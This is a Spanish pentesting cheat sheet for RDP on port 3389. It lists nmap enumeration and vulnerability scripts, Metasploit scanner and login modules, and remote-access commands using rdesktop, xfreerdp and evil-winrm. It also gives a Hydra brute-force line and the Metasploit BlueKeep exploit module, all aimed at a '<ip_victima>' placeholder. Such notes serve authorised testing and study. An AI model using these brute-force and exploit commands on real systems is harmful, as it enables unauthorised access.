# RDP (3389)

---

# **🛠️ Herramientas Principales:**

- 🔍 Nmap + Scripts NSE: Enumeración y detección de vulnerabilidades.
- 🛠️ Metasploit: Explotación de fallos y acceso no autorizado.
- 🔧 Hydra: Ataques de fuerza bruta para credenciales.
- 📊 Rdesktop, XFreeRDP, Evil-WinRM: Acceso remoto y gestión de sesiones.

# **🔍 Enumeración RDP**

## NMAP

```bash
nmap -p 3389 -sCV <ip_victima> # Escaneo para intentar ver la versión.
nmap -p 3389 --script rdp-enum-encryption <ip_victima> # Identificación de cifrado RDP.
nmap -p 3389 --script rdp-vuln-ms12-020 <ip_victima> # Detección de vulnerabilidad MS12-020.
nmap -p 3389 --script rdp-ntlm-info <ip_victima> # Extracción de información NTLM.
nmap -p 3389 --script rdp-brute <ip_victima> # Ataque de fuerza bruta a RDP.
```

## Metasploit

`auxiliary/scanner/rdp/rdp_scanner` (útil si está en puertos no estándar).

`use auxiliary/scanner/rdp/rdp_login`  # Fuerza bruta RDP Login

# ⌨️ Acceso RDP

🔹 Rdesktop

```bash
rdesktop -u <usuario> -p <contraseña> <ip_victima>
```

🔹 XFreeRDP

```bash
xfreerdp /v:<ip_victima> /u:<usuario> /p:<contraseña>
```

🔹 Evil-WinRM (para sesiones PowerShell remotas)

```bash
evil-winrm -i <ip_victima> -u <usuario> -p <contraseña>
```

# 💥 Explotación RDP

- **Fuerza Bruta (Hydra):** `hydra -L users.txt -P pass.txt rdp://<IP>`.
- **BlueKeep (CVE-2019-0708):** Vulnerabilidad RCE crítica. Módulo MSF: `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`.